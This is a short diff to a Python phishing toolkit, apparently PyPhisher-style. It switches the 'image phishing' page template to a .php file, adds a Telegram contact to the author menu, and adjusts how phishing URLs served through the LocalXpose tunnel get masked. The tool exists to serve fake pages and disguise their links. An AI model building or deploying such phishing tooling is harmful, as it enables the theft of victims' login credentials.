@@ -864,9 +864,9 @@ def set_login():
 # Additional configuration for image phishing
 def set_image():
     global fest, ytid
-    sed("festName", fest, f"{site_dir}/index.html")
+    sed("festName", fest, f"{site_dir}/index.html.php")
     ytid = sub("([/%+&?={} ])", "", ytid)
-    sed("ytId", ytid, f"{site_dir}/index.html")
+    sed("ytId", ytid, f"{site_dir}/index.html.php")
 
 # Additional configuration for video phishing
 def set_duration():
@@ -990,6 +990,7 @@ def about():
     print(f"{red}{yellow}[{purple}Author{yellow}]        {cyan} : {yellow}[{green}\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{yellow}] ")
     print(f"{red}{yellow}[{purple}Github{yellow}]        {cyan} : {yellow}[{green}https://github.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{purple}{yellow}] ")
     print(f"{red}{yellow}[{purple}Messenger{yellow}]     {cyan} : {yellow}[{green}https://m.me/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{yellow}] ")
+    print(f"{red}{yellow}[{purple}Telegram {yellow}]     {cyan} : {yellow}[{green}https://t.me/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{yellow}] ")
     print(f"{red}{yellow}[{purple}Email{yellow}]         {cyan} : {yellow}[{green}\x6b\x61\x73\x72\x6f\x75\x64\x72\x61krd@gmail.com{yellow}] ")
     print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
     inp = input(f"\n{ask}Choose your option: {green}")
@@ -1420,7 +1421,7 @@ def server():
             url_manager(lx_url, "LocalXpose")
         if lhr_success:
             url_manager(lhr_url, "LocalHostRun")
-        elif lx_success and tunneler.lower() in [ "loclx", "lx" ]:
+        if lx_success and tunneler.lower() in [ "loclx", "lx" ]:
             masking(lx_url)
         elif lhr_success and tunneler.lower() in [ "localhostrun", "lhr" ]:
             masking(lhr_url)
